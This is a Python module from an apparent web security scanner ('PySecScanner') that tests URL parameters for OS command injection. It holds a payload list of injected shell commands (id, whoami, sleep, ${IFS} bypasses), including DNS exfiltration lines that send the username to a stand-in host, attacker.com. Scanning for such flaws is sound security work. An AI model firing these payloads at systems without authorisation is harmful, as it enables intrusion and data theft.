"""
命令注入漏洞检测模块
检测操作系统命令注入漏洞
"""

import asyncio
import aiohttp
import re
from typing import List, Dict, Optional
from dataclasses import dataclass
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from core.base import BaseModule, ScanResult, Severity, ResultType
from core.logger import Logger


@dataclass
class CommandInjectionPoint:
    """命令注入漏洞点"""
    parameter: str
    injection_type: str
    payload: str
    evidence: str
    os_type: str = "unknown"


# 命令注入Payload
CMD_PAYLOADS = [
    # Unix命令
    ("; id", "unix"),
    ("| id", "unix"),
    ("`id`", "unix"),
    ("$(id)", "unix"),
    ("; whoami", "unix"),
    ("| whoami", "unix"),
    ("&& whoami", "unix"),
    ("|| whoami", "unix"),
    ("\n id", "unix"),
    ("\r\n id", "unix"),
    
    # Windows命令
    ("& whoami", "windows"),
    ("| whoami", "windows"),
    ("&& whoami", "windows"),
    ("|| whoami", "windows"),
    ("\n whoami", "windows"),
    
    # 时间盲注 - Unix
    ("; sleep 5", "time_unix"),
    ("| sleep 5", "time_unix"),
    ("&& sleep 5", "time_unix"),
    ("`sleep 5`", "time_unix"),
    
    # 时间盲注 - Windows
    ("& timeout 5", "time_windows"),
    ("| timeout 5", "time_windows"),
    
    # DNS外带
    ("; nslookup $(whoami).attacker.com", "dns_exfil"),
    ("| ping -c 1 $(whoami).attacker.com", "dns_exfil"),
    
    # 绕过技巧
    (";{id,}", "bypass"),
    (";${IFS}id", "bypass_space"),
    ("|<id", "bypass"),
]

# 命令执行响应特征
CMD_INDICATORS = [
    (r"uid=\d+\(.*?\)\s+gid=\d+", "unix"),  # id命令输出
    (r"uid=\d+", "unix"),
    (r"gid=\d+", "unix"),
    (r"groups=\d+", "unix"),
    (r"\\[a-z]+\\[a-z]+", "windows"),  # Windows用户名格式
    (r"authority", "windows"),
    (r"desktop-", "windows"),  # Windows计算机名
]


class CommandInjectionScanner(BaseModule):
    """
    命令注入漏洞扫描器
    检测操作系统命令注入漏洞
    """
    
    name = "command_injection_scanner"
    description = "命令注入漏洞检测器"
    author = "PySecScanner"
    version = "1.0.0"
    
    def __init__(self, config=None, logger=None):
        super().__init__(config, logger)
        self.timeout = 15
        self.concurrency = 3
        self.payloads = CMD_PAYLOADS
        self.vuln_points: List[CommandInjectionPoint] = []
        self.base_url = ""
    
    async def scan(self, target: str) -> List[ScanResult]:
        """
        执行命令注入扫描
        
        Args:
            target: 目标URL
        """
        self.base_url = self._normalize_url(target)
        if not self.base_url:
            self.logger.error(f"无效的URL: {target}")
            return []
        
        self.logger.info(f"目标URL: {self.base_url}")
        
        # 解析参数
        params = self._extract_parameters(self.base_url)
        if not params:
            self.logger.warning("未发现可测试的参数")
            return []
        
        self.logger.info(f"发现参数: {', '.join(params.keys())}")
        
        # 执行测试
        self.vuln_points = await self._test_command_injection(params)
        
        # 生成结果
        results = []
        for vuln in self.vuln_points:
            result = ScanResult(
                result_type=ResultType.VULNERABILITY,
                title=f"命令注入漏洞: {vuln.parameter}",
                description=f"参数 '{vuln.parameter}' 存在命令注入漏洞，类型: {vuln.injection_type}",
                severity=Severity.CRITICAL,
                target=self.base_url,
                evidence=f"参数: {vuln.parameter}\nPayload: {vuln.payload}\n证据: {vuln.evidence}\n系统: {vuln.os_type}",
                raw_data=vuln.__dict__
            )
            results.append(result)
            self.add_result(result)
        
        if self.vuln_points:
            self.logger.print_result(
                "发现的命令注入漏洞",
                [f"{v.parameter} ({v.injection_type})" for v in self.vuln_points]
            )
        else:
            self.logger.info("未发现命令注入漏洞")
        
        return results
    
    def _normalize_url(self, url: str) -> str:
        """规范化URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url
    
    def _extract_parameters(self, url: str) -> Dict[str, str]:
        """提取URL参数"""
        parsed = urlparse(url)
        params = {}
        
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for key, values in query_params.items():
                params[key] = values[0] if values else ""
        
        return params
    
    async def _test_command_injection(self, params: Dict[str, str]) -> List[CommandInjectionPoint]:
        """测试命令注入"""
        semaphore = asyncio.Semaphore(self.concurrency)
        vuln_points: List[CommandInjectionPoint] = []
        tested = set()
        
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async def test_param(param_name: str, original_value: str) -> Optional[CommandInjectionPoint]:
            async with semaphore:
                for payload, payload_type in self.payloads:
                    test_key = f"{param_name}:{payload[:20]}"
                    if test_key in tested:
                        continue
                    tested.add(test_key)
                    
                    test_params = params.copy()
                    test_params[param_name] = original_value + payload
                    test_url = self._build_url(test_params)
                    
                    try:
                        import time
                        start_time = time.time()
                        
                        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                            async with session.get(test_url) as response:
                                content = await response.text()
                                elapsed = time.time() - start_time
                                
                                # 时间盲注检测
                                if "time" in payload_type and elapsed >= 4:
                                    return CommandInjectionPoint(
                                        parameter=param_name,
                                        injection_type="time-based blind",
                                        payload=payload,
                                        evidence=f"响应时间: {elapsed:.2f}秒",
                                        os_type="unix" if "unix" in payload_type else "windows"
                                    )
                                
                                # 响应特征检测
                                for pattern, os_type in CMD_INDICATORS:
                                    if re.search(pattern, content, re.IGNORECASE):
                                        return CommandInjectionPoint(
                                            parameter=param_name,
                                            injection_type="command execution",
                                            payload=payload,
                                            evidence=f"匹配模式: {pattern}",
                                            os_type=os_type
                                        )
                                        
                    except asyncio.TimeoutError:
                        # 超时可能是命令执行
                        if "time" in payload_type:
                            return CommandInjectionPoint(
                                parameter=param_name,
                                injection_type="time-based blind",
                                payload=payload,
                                evidence="请求超时",
                                os_type="unix" if "unix" in payload_type else "windows"
                            )
                    except Exception:
                        pass
                
                return None
        
        tasks = [test_param(name, value) for name, value in params.items()]
        
        completed = 0
        total = len(tasks)
        
        for coro in asyncio.as_completed(tasks):
            result = await coro
            completed += 1
            self.logger.print_progress(completed, total, "命令注入测试中")
            
            if result:
                vuln_points.append(result)
        
        print()
        
        return vuln_points
    
    def _build_url(self, params: Dict[str, str]) -> str:
        """构建测试URL"""
        parsed = urlparse(self.base_url)
        query = urlencode(params)
        
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            query,
            parsed.fragment
        ))
